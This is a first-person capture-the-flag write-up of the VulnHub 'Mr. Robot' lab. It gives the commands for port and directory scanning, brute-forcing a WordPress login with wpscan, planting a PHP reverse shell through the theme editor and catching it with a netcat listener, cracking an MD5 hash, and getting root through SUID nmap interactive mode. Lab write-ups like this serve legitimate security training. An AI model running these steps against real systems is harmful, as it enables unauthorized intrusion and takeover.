# MR. Robot

**Platform:** VulnHub
**OS:** Linux
**Tags:** WordPress, Brute Force, SUID, nmap interactive, 3 flags
**Date:** 2026-05-04

wpscan brute-forces WordPress admin credentials; the template editor deploys a PHP reverse shell as daemon. SUID nmap interactive mode gives root across three flags.

## 1. Enumeration

Started with a full port scan to identify running services on the machine.

```bash
nmap -sV -sC -p- <TARGET_IP>
```

Findings:
- 80/tcp - HTTP, Web server (Apache)
- 443/tcp - HTTPS, same web server
- 22/tcp - SSH, closed initially

## 2. Web Investigation

The website is themed around the Mr. Robot show. Explored the site for hidden clues and ran directory brute-forcing to find hidden paths.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Findings:
- /robots.txt - Contains two entries: key file and a wordlist
- /wp-login.php - WordPress admin login, confirms CMS
- Key-1-of-3.txt - First flag found via robots.txt

Tip: Always check `/robots.txt` first. It's a goldmine. In this box it literally handed over the first flag and a custom wordlist.

## 3. Initial Foothold

WordPress was running. Used the custom wordlist found in robots.txt to brute-force the login, then uploaded a PHP reverse shell via the theme editor.

```bash
wpscan --url http://<TARGET_IP> --enumerate u
wpscan --url http://<TARGET_IP> -U elliot -P fsocity.dic
```

After gaining WordPress admin access, navigated to **Appearance - Theme Editor - 404.php** and replaced it with a PHP reverse shell.

```bash
nc -lvnp 4444
```

**Shell caught as:** daemon, low-privileged web user

Stabilised the shell and navigated to `/home/robot/`. Found a MD5 hashed password and `key-2-of-3.txt` (not readable yet).

```bash
# Crack the MD5 hash from password.raw-md5
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Password cracked.** Switched to user `robot`. Retrieved key 2.

## 4. Privilege Escalation

Searched for SUID binaries to find a privilege escalation path.

```bash
find / -perm -u=s -type f 2>/dev/null
```

- nmap: Found with SUID bit set, old version with interactive mode

```bash
nmap --interactive
nmap> !sh
```

**Root shell obtained.** Retrieved key 3 from `/root/key-3-of-3.txt`

## 5. Flags

1. Found via `/robots.txt` during initial web enumeration
2. Found in `/home/robot/` after cracking MD5 hash and switching users
3. Found in `/root/` after SUID nmap privilege escalation

This was my first completed CTF machine. Mr. Robot taught me that enumeration is everything. The first flag was sitting in robots.txt the whole time. Never skip the basics.
